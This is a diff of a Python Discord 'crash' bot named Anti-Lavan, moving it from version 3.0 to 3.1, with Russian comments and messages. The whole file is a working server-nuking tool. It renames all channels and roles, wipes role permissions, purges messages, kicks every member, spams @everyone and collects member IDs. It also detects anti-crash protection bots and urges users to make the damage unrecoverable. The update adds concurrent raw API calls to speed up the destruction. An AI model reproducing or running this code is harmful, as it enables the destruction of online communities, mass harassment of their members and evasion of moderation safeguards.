@@ -9,26 +9,36 @@ dP    Yb 8   8  Y8P 8      8888 `Y88   YP   `Y88 8   8
                                                           """
 print(cl)
 
-updates = 'Anti-Lavan 3.0 (открытый исходный код)\n- Исправлена команда purge, она чистила только текущий канал, задумано было все\n- Теперь некоторые функции бота можно настроить\n- Изменен алгоритм краша\n- У бота теперь открытый исходный код!\n- Добавлены логи краша'
+updates = 'Anti-Lavan 3.1 (открытый исходный код)\n\n[ 3.0 ]\n- Исправлена команда purge, она чистила только текущий канал, задумано было все\n- Теперь некоторые функции бота можно настроить\n- Изменен алгоритм краша\n- У бота теперь открытый исходный код!\n- Добавлены логи краша\n\n[ 3.1 ]\n- Добавлены потоки, как ни странно\n- Бот теперь использует requests для краша\n- Добавлена colorama\n- Добавлена команда find_anticrash'
 
-token = input('Token --> ')
-prefix = input('Prefix --> ')
-echo = input('Показать ли список изменений ( да / нет ) --> ')
-if str(echo) == 'да':
-    print(updates + '\n')
-else:
-    pass
-
-channelname = 'Crashed By Anti-Lavan'
-rolename = 'Crashed By Anti-Lavan'
-reasonb = 'Сервер крашнут ботом Anti-Lavan'
+# заранее извиняюсь за говнокод если он тут есть
 
 import discord
+import colorama
+from colorama import Fore, init
 from discord import *
 from discord.ext import commands
 import asyncio
 import time
+import requests as rq
 from discord import Permissions
+init()
+
+print(Fore.GREEN)
+token = input('Введите токен бота --> ')
+print(Fore.YELLOW)
+prefix = input('Укажите префикс боту --> ')
+print(Fore.CYAN)
+echo = input('Показать ли список изменений ( да / нет ) --> ')
+if 'да' in str(echo.lower()):
+    print(Fore.GREEN)
+    print(updates + '\n')
+else:
+    pass
+
+channelname = 'Crash By Anti-Lavan'
+rolename = 'Crashed By Anti-Lavan'
+reasonb = 'Сервер крашнут ботом Anti-Lavan'
 
 intents = discord.Intents.default()
 intents.members = True
@@ -37,53 +47,68 @@ client.remove_command('help') # удаляем встроенную команд
 
 @client.event
 async def on_ready():
-    print(f'[ LOG ] {client.user} запущен!')
+    print(f'{Fore.YELLOW}[ LOG ] {client.user} запущен!')
+
+async def sendrenchannel(chh):
+        oldname = chh.name
+        try:
+            r = rq.patch(f'https://discord.com/api/v9/channels/{chh.id}',json={'name': channelname},headers={'authorization': f'Bot {token}'})
+        except Exception as e:
+            print(f'{Fore.RED}[ ERROR ] Не смог изменить имя каналу {oldname} на сервере {chh.guild.name}')
+        else:
+            print(f'{Fore.GREEN}[ LOG ] #{oldname} --> #{channelname}')
+
+async def sendrenrole(rll):
+        oldname = rll.name
+        try:
+            r = rq.patch(f'https://discord.com/api/v9/guilds/{rll.guild.id}/roles/{rll.id}',json={'name': rolename, 'permissions': '0'},headers={'authorization': f'Bot {token}'})
+        except Exception as e:
+            print(f'{Fore.RED}[ ERROR ] Не смог изменить имя роли @{oldname} и сбросить ей права на сервере {rll.guild.name}')
+        else:
+            print(f'{Fore.GREEN}[ LOG ] @{oldname} --> @{rolename} (права = 0)')
+
+@client.command()
+async def find_anticrash(ctx):
+    await ctx.guild.chunk()
+    foundbots = 'Найдены анти-краш-боты:'
+    allbots = 0
+    for member in ctx.guild.members:
+        if str(member.name) in ['Lavan', 'Crash Protect', 'VEGA ⦡']:
+            allbots +=1
+            foundbots = foundbots + f'\n- {str(member.name)}'
+    if allbots == 0:
+        await ctx.send(embed=discord.Embed(title=':white_check_mark: Отлично, анти-краш-боты не найдены!', colour=discord.Colour.from_rgb(0,228,0)))
+    else:
+        await ctx.send(embed=discord.Embed(title=f':warning: Найдено {allbots} анти-краш-бот(а)',description=foundbots,colour=discord.Colour.from_rgb(228,0,0)))
 
 @client.command()
 async def rename_channels(ctx):
     for channel in ctx.guild.channels:
-        oldname = channel.name
         try:
-            await channel.edit(name=channelname)
-        except:
-            print(f'[ ERROR ] Не смог изменить имя каналу {oldname} на сервере {ctx.guild.name}')
-        else:
-            print(f'[ LOG ] #{oldname} --> #{channelname}')
+            asyncio.create_task(sendrenchannel(channel))
+        except Exception as e:
+            print(e)
 
 @client.command()
-async def rename_roles(ctx):
-    for role in ctx.guild.roles:
-        oldrole = role.name
-        try:
-            await role.edit(name=rolename)
-        except:
-            print(f'[ ERROR ] Не смог изменить имя роли {oldrole} на сервере {ctx.guild.name}')
-        else:
-            print(f'[ LOG ] {oldrole} --> {rolename}')
-
-@client.command()
-async def deop_roles(ctx):
-    perms = Permissions()
-    count = 1
-    perms.update(read_messages=False, ban_members=False, kick_members=False, send_messages=False, create_instant_invite=False, administrator=False, manage_channels=False, manage_guild=False, add_reactions=False, view_audit_log=False, priority_speaker=False, stream=False, view_channel=False, send_tts_messages=False, manage_messages=False, embed_links=False, attach_files=False, read_message_history=False, mention_everyone=False, external_emojis=False, use_external_emojis=False, view_guild_insights=False, connect=False, speak=False, mute_members=False, deafen_members=False, move_members=False, use_voice_activation=False, change_nickname=False, manage_nicknames=False, manage_roles=False, manage_permissions=False, manage_webhooks=False, manage_emojis=False, use_slash_commands=False, request_to_speak=False)
+async def kill_roles(ctx):
     for role in ctx.guild.roles:
         try:
-            await role.edit(permissions=perms)
+            asyncio.create_task(sendrenrole(role))
         except:
-            print(f'[ ERROR ] Не изменил права роли {role.name}')
+            pass
         else:
-            print(f'[ LOG ] Изменил права у роли #{count}')
-            count +=1
+            pass
 
 @client.command()
 async def purge(ctx):
     for channel in ctx.guild.text_channels:
         try:
             await channel.purge(limit=1000)
-        except:
-            print(f'[ ERROR ] Не очистил сообщения на сервере {ctx.guild.name} в канале {channel.name}')
+        except Exception as e:
+            print(e)
+            print(f'{Fore.RED}[ ERROR ] Не очистил сообщения на сервере {ctx.guild.name} в канале {channel.name}')
         else:
-            print(f'[ LOG ] Очистил 1000 сообщений в канале {channel.name} на сервере {ctx.guild.name}')
+            print(f'{Fore.YELLOW}[ LOG ] Очистил 1000 сообщений в канале {channel.name} на сервере {ctx.guild.name}')
 
 @client.command()
 async def kick_all(ctx):
@@ -92,111 +117,79 @@ async def kick_all(ctx):
             try:
                 await user.kick(reason=reasonb)
             except:
-                print(f'[ ERROR ] Сервер {ctx.guild.name} | Не смог кикнуть участника {user.name}#{user.discriminator}')
+                print(f'{Fore.RED}[ ERROR ] Сервер {ctx.guild.name} | Не смог кикнуть участника {user.name}#{user.discriminator}')
             else:
-                print(f'[ LOG ] Кикнул участника {user.name}#{user.discriminator}')
+                print(f'{Fore.YELLOW}[ LOG ] Кикнул участника {user.name}#{user.discriminator}')
 
 @client.command()
 async def icon(ctx):
     with open('bebra.png', 'rb') as f:
         avatar = f.read()
         await ctx.guild.edit(icon=avatar)
-    print(f'[ LOG ] Успешно изменил иконку серверу {ctx.guild.name}')
+    print(f'{Fore.YELLOW}[ LOG ] Успешно изменил иконку серверу {ctx.guild.name}')
+
+async def sendspam(channel):
+        try:
+            for _ in range(5):
+                await channel.send('@everyone / @here\nДанный сервер крашиться ботом Anti-Lavan (разработчик в telegram - `@forzel_discord`)\nTelegram channel: https://t.me/protectcheck')
+        except:
+            print(f'{Fore.RED}[ ERROR ] Не отправил спам на сервер {ctx.guild.name} в канал #{channel.name}')
+
 
 @client.command()
 async def spam(ctx):
     for channel in ctx.guild.text_channels:
         try:
-            await channel.send('@everyone / @here\nДанный сервер крашиться ботом Anti-Lavan (разработчик в telegram - `@forzel_discord`)\nTelegram channel: https://t.me/protectcheck')
-            await channel.send('@everyone / @here\nДанный сервер крашиться ботом Anti-Lavan (разработчик в telegram - `@forzel_discord`)\nTelegram channel: https://t.me/protectcheck')
-            await channel.send('@everyone / @here\nДанный сервер крашиться ботом Anti-Lavan (разработчик в telegram - `@forzel_discord`)\nTelegram channel: https://t.me/protectcheck')
+            asyncio.create_task(sendspam(channel))
         except:
-            print(f'[ ERROR ] Не отправил спам на сервер {ctx.guild.name} в канал #{channel.name}')
+            print(f'{Fore.RED}[ ERROR ] Ошибка при отправке спама на сервер {ctx.guild.name}')
 
 @client.command()
 async def auto(ctx):
-    print(f'[ LOG ] Сервер {ctx.guild.name} | Краш запущен')
+    print(f'{Fore.GREEN}[ LOG ] Сервер {ctx.guild.name} | Краш запущен')
+    for channel in ctx.guild.text_channels:
+        try:
+            asyncio.create_task(sendspam(channel))
+        except:
+            print(f'{Fore.RED}[ ERROR ] Ошибка при отправке спама на сервер {ctx.guild.name}')
+
     members = []
+    await ctx.guild.chunk()
     for member in ctx.guild.members:
         members.append(member.id)
 
     with open(f'crash-{ctx.guild.id}.txt', 'w') as f:
-        f.write(f'Список всех участников сервера {ctx.guild.id}:\n{members}\n(c) Anti-Lavan, 2021')
+        f.write(f'Список всех участников сервера {ctx.guild.id}:\n{members}\n(c) Anti-Lavan, 2021-2022')
 
-    print(f'[ LOG ] Сервер {ctx.guild.name} | Собрал всех участников сервера в файл crash-{ctx.guild.id}.txt')
+    print(f'{Fore.GREEN}[ LOG ] Сервер {ctx.guild.name} | Собрал всех участников сервера в файл crash-{ctx.guild.id}.txt')
 
     with open('bebra.png', 'rb') as f:
         avatar = f.read()
         await ctx.guild.edit(icon=avatar)
 
-    print(f'[ LOG ] Сервер {ctx.guild.name} | Изменена иконка серверу (имя нельзя)')
-    print(f'[ LOG ] Сервер {ctx.guild.name} | Начинаю изменение названий каналов')
-
-    for channel in ctx.guild.channels:
-        oldname = channel.name
-        try:
-            await channel.edit(name=channelname)
-        except:
-            print(f'[ ERROR ] Не изменил название канала #{channel.name}')
-        else:
-            print(f'[ LOG ] #{oldname} --> #{channelname}')
-
-    print(f'[ LOG ] Сервер {ctx.guild.name} | Названия каналов изменены. Начинаю изменять названия ролей...')
-    for role in ctx.guild.roles:
-        oldrole = role.name
-        try:
-            await role.edit(name=rolename)
-        except:
-            print(f'[ ERROR ] Не изменил название роли {role.name}')
-        else:
-            print(f'[ LOG ] {oldrole} --> {rolename}')
-
-    print(f'[ LOG ] Названия ролей изменены. Теперь у них забираю права...')
-
-    perms = Permissions()
-    count = 1
-    perms.update(read_messages=False, ban_members=False, kick_members=False, send_messages=False, create_instant_invite=False, administrator=False, manage_channels=False, manage_guild=False, add_reactions=False, view_audit_log=False, priority_speaker=False, stream=False, view_channel=False, send_tts_messages=False, manage_messages=False, embed_links=False, attach_files=False, read_message_history=False, mention_everyone=False, external_emojis=False, use_external_emojis=False, view_guild_insights=False, connect=False, speak=False, mute_members=False, deafen_members=False, move_members=False, use_voice_activation=False, change_nickname=False, manage_nicknames=False, manage_roles=False, manage_permissions=False, manage_webhooks=False, manage_emojis=False, use_slash_commands=False, request_to_speak=False)
-    for role in ctx.guild.roles:
-        try:
-            await role.edit(permissions=perms)
-        except:
-            print(f'[ ERROR ] Не изменил права роли {role.name}')
-        else:
-            print(f'[ LOG ] Изменил права у роли #{count}')
-            count +=1
-
-    print('[ LOG ] Всем ролям изменил права. Начинаю кик всех участников сервера.')
-    for user in ctx.guild.members:
-        if int(user.id) != int(ctx.message.author.id):
-            try:
-                await user.kick(reason=reasonb)
-            except:
-                print(f'[ ERROR ] Не смог кикнуть участника {user.name}#{user.discriminator}')
-            else:
-                print(f'[ LOG ] Кикнул участника {user.name}#{user.discriminator}')
-
-    print('[ LOG ] Кикнул всех, кого мог. Последний этап краша - СПАМ ВО ВСЕ КАНАЛЫ запущен!')
-    await spam(ctx)
-    asyncio.create_task(spam(ctx))
-    asyncio.create_task(spam(ctx))
-    asyncio.create_task(spam(ctx))
-    asyncio.create_task(spam(ctx))
-    asyncio.create_task(spam(ctx))
-    asyncio.create_task(spam(ctx))
-    asyncio.create_task(spam(ctx))
-    asyncio.create_task(spam(ctx))#почему то for i in range не работал, по этому так
-    asyncio.create_task(spam(ctx)) 
-    print(f'[ LOG ] Краш сервера {ctx.guild.name} окончен. Спасибо за использование Anti-Lavan-а!')
+    print(f'{Fore.GREEN}[ LOG ] Сервер {ctx.guild.name} | Изменена иконка серверу (имя нельзя)')
+    
+    try:
+        asyncio.create_task(spam(ctx))
+        asyncio.create_task(purge(ctx))
+        asyncio.create_task(kick_all(ctx))
+        asyncio.create_task(rename_channels(ctx))
+        asyncio.create_task(kill_roles(ctx))
+    except Exception as e:
+        print(e)
+        print(f'{Fore.RED}Ошибка при работе краша, попробуйте заного.')
+    else:
+        print(f'{Fore.GREEN}[ LOG ] Краш сервера {ctx.guild.name}: все потоки краша запущены. Спасибо за использование нашего бота!')
 
 @client.command()
 async def help(ctx):
     embed = discord.Embed(title='Список команд',
-      description=f'Авто-краш сервера\n```py\n{prefix}auto```\nИзменить иконку сервера (название нельзя, лаван банит за это)\n```py\n{prefix}icon```\nПереименовать все каналы в "{channelname}"\n```py\n{prefix}rename_channels```\nКикнуть всех участников сервера\n```py\n{prefix}kick_all```\nПереименовать все роли в "{rolename}"\n```py\n{prefix}rename_roles```\nЗабирает все права у всех ролей\n```py\n{prefix}deop_roles```\nCпам во все каналы\n```py\n{prefix}spam```\nОчистить 1000 сообщений во всех каналах\n```py\n{prefix}purge```\n\n**Чтобы все функции работали корректно, перемести мою роль как можно выше (необязательно выше чем лавана)**',
+      description=f'Авто-краш сервера\n```py\n{prefix}auto```\nИзменить иконку сервера (название нельзя, лаван банит за это)\n```py\n{prefix}icon```\nПереименовать все каналы в "{channelname}"\n```py\n{prefix}rename_channels```\nКикнуть всех участников сервера\n```py\n{prefix}kick_all```\nПереименовать все роли в "{rolename} и убрать их права"\n```py\n{prefix}kill_roles```\nCпам во все каналы\n```py\n{prefix}spam```\nОчистить 1000 сообщений во всех каналах\n```py\n{prefix}purge```\nПоиск анти-краш-ботов на сервере\n```py\n{prefix}find_anticrash```\n\n**Чтобы все функции работали корректно, перемести мою роль как можно выше (необязательно выше чем лавана)**\n**После краша сервера пропиши l.save , чтобы сервер невозможно было восстановить :)**',
       colour=(discord.Colour.from_rgb(106, 192, 245)))
     await ctx.send(embed=embed)
 
 try:
     client.run(token)
 except:
-    print('[ ERROR ] Ты ввёл неверный токен бота или не включил ему интенты!')
+    print(f'{Fore.RED}[ ERROR ] Ты ввёл неверный токен бота или не включил ему интенты!')
     input()
